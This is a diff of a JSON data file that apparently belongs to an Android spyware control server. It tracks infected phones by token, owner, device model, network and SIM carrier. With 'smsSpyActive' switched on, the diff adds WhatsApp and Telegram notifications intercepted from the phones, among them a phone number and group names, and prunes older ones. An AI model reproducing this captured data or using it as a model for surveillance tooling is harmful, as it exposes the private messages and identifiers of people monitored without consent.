@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777350567980,
+    "lastSeen": 1777350570898,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -474,6 +474,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350570159
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350569785
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350569765
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Sending video to +62 852-3694-0729",
+        "time": "28/04 11:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350569757
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4441,38 +4473,6 @@
         "time": "27/04 19:35",
         "pkg": "com.whatsapp",
         "receivedAt": 1777293331333
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "GC STOK RECEH👻",
-        "content": "‎13 pesan baru",
-        "time": "27/04 19:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777293316099
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "GC STOK RECEH👻",
-        "content": "‎13 pesan baru",
-        "time": "27/04 19:35",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777293302940
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "GC STOK RECEH👻",
-        "content": "‎13 pesan baru",
-        "time": "27/04 19:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777293294130
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "GC STOK RECEH👻",
-        "content": "‎13 pesan baru",
-        "time": "27/04 19:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777293266485
       }
     ],
     "galleryPhotos": [],
@@ -4491,14 +4491,14 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777350568833,
+    "lastSeen": 1777350570478,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
     "deviceInfo": {
       "model": "realme RMX2103",
       "androidVersion": "Android 11",
-      "battery": 100,
+      "battery": 89,
       "network": "WiFi: ARNET-HOTSPOT",
       "sim1": "XL Axiata",
       "sim2": "Tidak ada layanan"
@@ -4507,6 +4507,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ ubilll・19301 pesan baru dari 154 obrolan",
+        "time": "28/04 11:29",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777350571518
+      },
       {
         "appName": "Telegram",
         "sender": "BLAST WA FREE😋🤑: AABMMWEX",
